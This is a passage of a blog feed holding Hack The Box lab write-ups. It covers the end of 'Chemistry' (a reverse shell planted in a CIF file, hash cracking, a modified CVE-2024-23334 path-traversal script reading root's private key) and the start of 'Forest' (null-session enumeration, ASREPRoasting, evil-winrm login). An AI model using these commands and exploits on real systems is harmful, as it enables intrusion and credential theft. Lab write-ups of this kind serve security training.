+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.4/1337 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After, uploading and clicking on view, we see the file was downloaded:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/web_server_hit.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Hit on python http server&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can now change the command, so that our reverse shell is executed&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/exec_shell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Changing the command in cif file&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After re-uploading the file, and then clicking on View, we finally get a shell back:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/got_shell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h2 id=&#34;user-flag&#34;&gt;User Flag&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;In our current directory, we find the source code of the website in &lt;code&gt;app.py&lt;/code&gt; which also contains credentials:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/db_pass.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Credentials in app.py&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After looking around some more, we find a the sqlite database inside the &lt;code&gt;instance&lt;/code&gt; directory.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;537926814&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;537926814&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;SQLite database found&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+app@chemistry:~/instance$ file database.db
+database.db: SQLite 3.x database, last written using SQLite version 3031001
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Looking at the contents of this file with &lt;code&gt;strings&lt;/code&gt;, we are able to get the hashes of the users:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/hashes.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Users&#39; hashes&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s try to crack the hash of the user &lt;code&gt;rosa&lt;/code&gt;, since they are on the machine:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;132568497&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;132568497&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking rosa&amp;rsquo;s hash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+hashcat -m 0 &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; /usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/rosa_cracked.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can ssh as &lt;code&gt;rosa&lt;/code&gt; and retrieve the user flag&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/user.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Usdr flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;root&#34;&gt;Root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;After some enumeration, we find out that something is running on &lt;code&gt;127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/netstat.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Netstat output&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can forward that port to our machine with:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;492786315&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;492786315&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Port forwarding :8080&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now after going to &lt;code&gt;http://127.0.0.1:8080&lt;/code&gt;, we get access to this website allowing us to list services:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/monitoring_site.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Monitoring website&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Looking at the response headers, we see something unusual for the &lt;code&gt;Server&lt;/code&gt; header (&lt;code&gt;Python/3.9 aiohttp/3.9.1&lt;/code&gt;):&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/res_headers.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Response Headers&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After some reasearch, we see that it might be vulnerable to CVE-2024-23334 which is a path traversal vulnerability.&lt;/p&gt;
+&lt;p&gt;Using this &lt;a href=&#34;https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh&#34;&gt;poc&lt;/a&gt; (with some little changes):&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;247398156&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;247398156&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;CVE-2024-23334 Exploit POC (modified)&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+#!/bin/bash
+
+url=&amp;#34;http://127.0.0.1:8080&amp;#34;
+string=&amp;#34;../&amp;#34;
+payload=&amp;#34;/&amp;#34;
+file=&amp;#34;etc/passwd&amp;#34;
+
+for ((i=0; i&amp;lt;15; i&amp;#43;&amp;#43;)); do
+    payload&amp;#43;=&amp;#34;$string&amp;#34;
+    echo &amp;#34;[&amp;#43;] Testing with $payload$file&amp;#34;
+    status_code=$(curl --path-as-is -s -o /dev/null -w &amp;#34;%{http_code}&amp;#34; &amp;#34;$url$payload$file&amp;#34;)
+    echo -e &amp;#34;\tStatus code --&amp;gt; $status_code&amp;#34;
+
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is &amp;#34;$url$payload$file&amp;#34;
+        break
+    fi
+done
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We were able to retrieve the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/etc_passwd.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reading /etc/passwd&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can repeat the same process in order to read the private key of the root user:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/id_rsa.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reading root&#39;s private key&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can use it to login as root and retrieve the flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/root.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Forest</title>
+      <link>//localhost:1313/posts/htb-forest/</link>
+      <pubDate>Sat, 16 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-forest/</guid>
+      <description>&lt;p&gt;Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account &lt;code&gt;svc-alfresco&lt;/code&gt;, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account &lt;code&gt;svc-alfresco&lt;/code&gt;, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.&lt;/p&gt;
+&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT      STATE SERVICE      VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;53/tcp    open  domain       Simple DNS Plus
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2024-11-16 21:23:22Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;135/tcp   open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;464/tcp   open  kpasswd5?
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;636/tcp   open  tcpwrapped
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3269/tcp  open  tcpwrapped
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;9389/tcp  open  mc-nmf       .NET Message Framing
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49664/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49665/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49666/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49667/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49671/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49677/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49681/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49698/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;50033/tcp open  msrpc        Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the scan results, we got the domain name (&lt;code&gt;htb.local&lt;/code&gt;) as well as the hostname of the machine (&lt;code&gt;FOREST&lt;/code&gt;). We can add them to our host file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.129.30.97\tFOREST FOREST.htb.local htb.local&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;user-enumeration&#34;&gt;User Enumeration&lt;/h4&gt;
+&lt;hr&gt;
+&lt;p&gt;First let&amp;rsquo;s see if we can enumerate users with &lt;code&gt;rpcclient&lt;/code&gt; by leveraging a SMB null session:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;523874961&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;523874961&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;User Enumeration with rpcclient through a NUL session&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+rpcclient -N -U &amp;#34;&amp;#34; 10.129.30.97
+
+rpcclient $&amp;gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We could have also used &lt;code&gt;netexec&lt;/code&gt; for this purpose:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nxc smb 10.129.30.97 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --users
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got back a few users:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;krbtgt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sebastien
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lucinda
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;svc-alfresco
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;andy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mark
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;santi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s note them somewhere and move on.&lt;/p&gt;
+&lt;h4 id=&#34;asreproasting&#34;&gt;ASREPRoasting&lt;/h4&gt;
+&lt;hr&gt;
+&lt;p&gt;Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let&amp;rsquo;s see if among our list of users account there are some that do not require kerberos pre-authentication:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;635429817&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;635429817&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;ASREPRoasting using impacket-GetNPUsers&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+impacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User Administrator doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User sebastien doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...&amp;lt;SNIP&amp;gt;...63836d7
+[-] User andy doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;As we can see, the service account &lt;code&gt;svc-alfresco&lt;/code&gt; does not require kerberos pre-authentication, hence we making it vulnerable to ASREPRoasting.&lt;/p&gt;
+&lt;p&gt;More on ASREPRoasting -&amp;gt; &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/kerberos/asreproast&#34;&gt;https://www.thehacker.recipes/ad/movement/kerberos/asreproast&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We can now try to crack it with hashcat:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;672938154&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;672938154&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking service ticket&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/forest/cracked_hash_svcalfresco.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;svc-alfresco password cracked !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Now that we have the password for &lt;code&gt;svc-alfresco&lt;/code&gt;, let&amp;rsquo;s try to login via winrm:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;419765382&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;419765382&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Login via winrm as svc-alfresco&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+evil-winrm -i 10.129.30.97 -u svc-alfresco -p &amp;lt;PASSWORD&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We successfully logged in and was able to retrieve the user flag at &lt;code&gt;C:\Users\svc-alfresco\Desktop\user.txt&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/forest/user_flag.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Now that we have a foothold in the domain, let&amp;rsquo;s use &lt;a href=&#34;https://github.com/dirkjanm/BloodHound.py&#34;&gt;bloodhound-python&lt;/a&gt; in order to collect information about the domain that we can than visualize after:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;235694781&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;235694781&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Collecting data for bloodhound&lt;/span&gt;
